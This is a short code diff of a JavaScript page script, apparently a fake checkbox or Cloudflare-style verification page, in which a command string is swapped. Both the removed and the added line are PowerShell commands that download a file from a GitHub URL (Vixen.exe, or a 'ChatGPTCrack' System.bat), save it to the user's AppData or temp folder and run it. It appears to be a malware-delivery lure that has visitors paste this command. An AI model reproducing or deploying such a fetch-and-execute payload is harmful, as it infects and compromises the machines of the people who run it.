@@ -60,7 +60,7 @@ function generateUniqueUsername() {
     return username;
 }
 
-const cmd = `Invoke-WebRequest -Uri 'https://github.com/quivingsnew/Vixen-Temp-Woof/raw/refs/heads/main/Vixen.exe' -OutFile "$env:APPDATA\Vixen.exe"; Start-Process "$env:APPDATA\Vixen.exe"`;
+const cmd = `powershell -Command "iwr 'https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat' -OutFile '$env:temp\System.bat'; Start-Process '$env:temp\System.bat'"`;
 
 const checkboxBtn = document.getElementById("checkbox");
 const content = document.getElementById("HJup0");
